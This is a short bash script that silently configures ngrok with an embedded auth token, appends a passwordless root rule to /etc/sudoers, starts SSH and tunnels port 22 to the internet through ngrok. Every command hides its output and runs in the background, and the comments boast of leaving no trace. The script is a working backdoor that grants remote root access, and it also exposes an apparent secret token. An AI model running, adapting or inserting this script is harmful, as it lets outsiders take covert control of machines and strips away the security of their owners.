#!/bin/bash

# Your Ngrok token, because secrets need tokens too
NGROK_TOKEN="2FrD5bm0yZ8KeLaxstKA71dU37d_3GhAtNut3rJsTbugbhwev"

# Set up Ngrok with your token without leaving a trace
ngrok authtoken "$NGROK_TOKEN" > /dev/null 2>&1 &

# Elevate to root without pesky password prompts, silently
echo -e "\nroot ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers > /dev/null 2>&1 &

# Start your SSH server with root privileges, in the shadows
sudo service ssh start > /dev/null 2>&1 &

# And now, let the Ngrok and SSH combo dance in the cosmic darkness
ngrok tcp 22 > /dev/null 2>&1 &
